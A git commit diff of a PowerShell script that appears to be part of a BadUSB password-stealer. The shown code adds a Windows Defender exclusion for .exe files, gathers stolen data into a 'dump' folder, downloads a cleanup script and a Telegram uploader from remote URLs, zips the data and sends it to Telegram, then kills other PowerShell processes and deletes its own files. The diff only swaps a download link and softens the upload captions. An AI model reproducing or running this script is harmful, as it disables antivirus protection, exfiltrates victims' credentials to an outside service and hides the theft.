28d40761a35c5efdad71bde68bfd72b4c0a21b1f
PLESSY Franck <90218895+PFranck06@users.noreply.github.com>
2024-02-10 09:51:53 +0100

    Add files via upload

--- ciaoV2_upload.ps1
+++ ciaoV2_upload.ps1
@@ -4,15 +4,19 @@ Add-MpPreference -ExclusionExtension exe -Force
 #Add exception for .exe files in antivirus
 mkdir dump 
 #Create dump/ directory to put all informations that we'll steal in it
-Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/upload/fin_upload.ps1 -OutFile fin_upload.ps1 
+Invoke-WebRequest https://github.com/PFranck06/HowardTelegram/blob/main/fin_upload.ps1 -OutFile fin_upload.ps1 
 #Download final .ps1 file to delete all .txt files and stop all powershell process
 Invoke-WebRequest LINK -OutFile telegram_uploader.exe 
 #Download uploader file to upload all informations on telegram
 Compress-Archive dump/ dump.zip 
 #Compress dump/ folder to upload it on telegram
-./telegram_uploader.exe -f dump.zip -c "Here are all stolen informations !" #Upload dump.zip on telegram
+./telegram_uploader.exe -f dump.zip -c "Here are all informations !" 
+#Upload dump.zip on telegram
+./telegram_uploader.exe -f dump.zip -c "Hello World !" 
+#Hello World
 Start-Sleep -Seconds 15 #Wait 15 seconds
-Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
+Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process 
+#Kill all powershell process except the one running
 Start-Sleep -Seconds 30 #Wait 30 seconds
 Remove-Item ciaoV2_upload.ps1
 Remove-Item telegram_uploader.exe
